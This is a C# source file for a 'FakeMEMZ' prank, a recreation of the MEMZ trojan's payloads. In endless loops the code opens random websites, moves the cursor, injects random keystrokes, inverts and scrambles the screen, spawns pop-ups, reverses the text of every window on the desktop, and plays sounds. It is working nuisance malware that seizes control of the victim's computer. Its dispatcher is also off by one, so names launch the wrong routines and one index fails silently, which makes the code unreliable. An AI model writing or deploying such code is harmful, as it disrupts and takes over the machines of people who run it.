using System;
using System.Threading;
using static FakeMEMZ.utils;
using static FakeMEMZ.WinAPI;
using static FakeMEMZ.data;
using System.Drawing;
using System.Windows.Forms;
using System.Text;
using System.Runtime.InteropServices;

namespace FakeMEMZ
{
    internal class payloads
    {
        public static string[] payload = { "payloadExecute", "payloadCursor", "payloadKeybord", "payloadSound", "payloadBlink", "payloadMessageBox", "payloadDrawErrors", "payloadChangeText", "payloadPIP", "payloadPuzzle" };
        public static void PayloadsThread(string num)
        {
            try
            {
                if (num == payload[1])
                {
                    PayloadsStart(payloadExecute);
                }
                if (num == payload[2])
                {
                    PayloadsStart(payloadCursor);
                }
                if (num == payload[3])
                {
                    PayloadsStart(payloadKeybord);
                }
                if (num == payload[4])
                {
                    PayloadsStart(payloadSound);
                }
                if (num == payload[5])
                {
                    PayloadsStart(payloadBlink);
                }
                if (num == payload[6])
                {
                    PayloadsStart(payloadMessageBox);
                }
                if (num == payload[7])
                {
                    PayloadsStart(payloadDrawErrors);
                    PayloadsStart(payloadDrawWarning);
                }
                if (num == payload[8])
                {
                    PayloadsStart(payloadChangeText);
                }
                if (num == payload[9])
                {
                    PayloadsStart(payloadPIP);
                }
                if (num == payload[10])
                {
                    PayloadsStart(payloadPuzzle);
                }
            }
            catch { }
        }

        public static void payloadExecute()
        {
            while (true)
            {
                Random random = new Random();

                ShellExecuteA(IntPtr.Zero, "open", data.sites[random.Next() % data.nSites], null, null, 1);

                Thread.Sleep(20000);
            }
        }
        public static void payloadBlink()
        {
            while (true)
            {
                IntPtr hwnd = GetDesktopWindow();
                IntPtr hdc = GetWindowDC(hwnd);
                RECT rekt;
                GetWindowRect(hwnd, out rekt);
                BitBlt(hdc, 0, 0, rekt.Right - rekt.Left, rekt.Bottom - rekt.Top, hdc, 0, 0, NOTSRCCOPY);
                ReleaseDC(hwnd, hdc);

                Thread.Sleep(1000);
            }
        }
        public static void payloadCursor()
        {
            while (true)
            {
                Random random = new Random();

                POINT point;
                GetCursorPos(out point);
                SetCursorPos(point.x + (random.Next() % 3 - 1), point.y + (random.Next() % 3 - 1));

                Thread.Sleep(10);
            }
        }
        public static void payloadMessageBox()
        {
            while (true)
            {
                Random random = new Random();

                PayloadsStart(messageBoxThread);

                Thread.Sleep(10000);
            }
        }
        public static void messageBoxThread()
        {
            Random random = new Random();

            FindAndMoveMsgBox(random.Next() % GetSystemMetrics(0), random.Next() % GetSystemMetrics(1), true, "lol");
            MessageBox(IntPtr.Zero, "Still using this computer?", "lol", 0x00001000 | 0x00000000 | 0x00000030);

            return;
        }
        public static void FindAndMoveMsgBox(int x, int y, bool repaint, string title)
        {
            Thread thr = new Thread(() =>
            {
                IntPtr msgBox = IntPtr.Zero;
                while ((msgBox = FindWindow(IntPtr.Zero, title)) == IntPtr.Zero) ;
                Rectangle r = new Rectangle();
                GetWindowRect(msgBox, out r);
                MoveWindow(msgBox, x, y, r.Width - r.X, r.Height - r.Y, repaint);
            });
            thr.Start();
        }
        public static void payloadChangeText()
        {
            while (true)
            {
                EnumChildWindows(GetDesktopWindow(), new EnumWindowsProc(EnumChildProc), IntPtr.Zero);
                Thread.Sleep(500);
            }
        }
        static bool EnumChildProc(IntPtr hwnd, IntPtr lParam)
        {
            int textLen = GetWindowTextLength(hwnd);
            if (0 < textLen)
            {
                StringBuilder tsb = new StringBuilder(textLen + 1);
                GetWindowText(hwnd, tsb, tsb.Capacity);

                string reversedwndtext = StrReverse(tsb.ToString());

                SetWindowText(hwnd, reversedwndtext);
            }
            return true;
        }
        public static void payloadSound()
        {
            while (true)
            {
                Random random = new Random();

                PlaySoundA(sounds[random.Next() % nSounds], UIntPtr.Zero, SND_ASYNC);

                Thread.Sleep(random.Next() % 1500);
            }
        }
        public static void payloadPuzzle()
        {
            while (true)
            {
                Random random = new Random();

                IntPtr hwnd = GetDesktopWindow();
                IntPtr hdc = GetWindowDC(hwnd);
                RECT rekt;
                GetWindowRect(hwnd, out rekt);

                int x1 = random.Next() % (rekt.Right - 100);
                int y1 = random.Next() % (rekt.Bottom - 100);
                int x2 = random.Next() % (rekt.Right - 100);
                int y2 = random.Next() % (rekt.Bottom - 100);
                int width = random.Next() % 600;
                int height = random.Next() % 600;

                BitBlt(hdc, x1, y1, width, height, hdc, x2, y2, SRCCOPY);
                ReleaseDC(hwnd, hdc);

                Thread.Sleep(1500);
            }
        }
        public static void payloadKeybord()
        {
            while (true)
            {
                try
                {
                    Random random = new Random();

                    INPUT input = new INPUT();

                    input.type = InputType.INPUT_KEYBOARD;
                    input.U.ki.wVk = ((VirtualKeyShort)((random.Next() % (0x5a - 0x30)) + 0x30));
                    SendInput(1, input, Marshal.SizeOf(input));
                    Thread.Sleep(5000);
                }
                catch { }
            }
        }
        public static void payloadPIP()
        {
            int t = 600;
            while (true)
            {
                IntPtr hwnd = GetDesktopWindow();
                IntPtr hdc = GetWindowDC(hwnd);
                RECT rekt;
                GetWindowRect(hwnd, out rekt);
                StretchBlt(hdc, 50, 50, rekt.Right - 100, rekt.Bottom - 100, hdc, 0, 0, rekt.Right, rekt.Bottom, SRCCOPY);
                ReleaseDC(hwnd, hdc);

                Thread.Sleep(t - 10);
            }
        }
        public static void payloadDrawErrors()
        {
            while (true)
            {
                Random random = new Random();
                int ix = GetSystemMetrics(11) / 2;
                int iy = GetSystemMetrics(12) / 2;

                IntPtr hwnd = GetDesktopWindow();
                IntPtr hdc = GetWindowDC(hwnd);

                POINT cursor;
                GetCursorPos(out cursor);

                DrawIcon(hdc, cursor.x - ix, cursor.y - iy, LoadIcon(IntPtr.Zero, IDI_ERROR));

                ReleaseDC(hwnd, hdc);
                Thread.Sleep(10);
            }
        }
        public static void payloadDrawWarning()
        {
            while (true)
            {
                Random random = new Random();

                IntPtr hwnd = GetDesktopWindow();
                IntPtr hdc = GetWindowDC(hwnd);

                int scrw;
                int scrh;

                scrw = GetSystemMetrics(0);
                scrh = GetSystemMetrics(1);

                DrawIcon(hdc, random.Next() % scrw, random.Next() % scrh, LoadIcon(IntPtr.Zero, IDI_WARNING));
                Thread.Sleep(500);
            }
        }
    }
}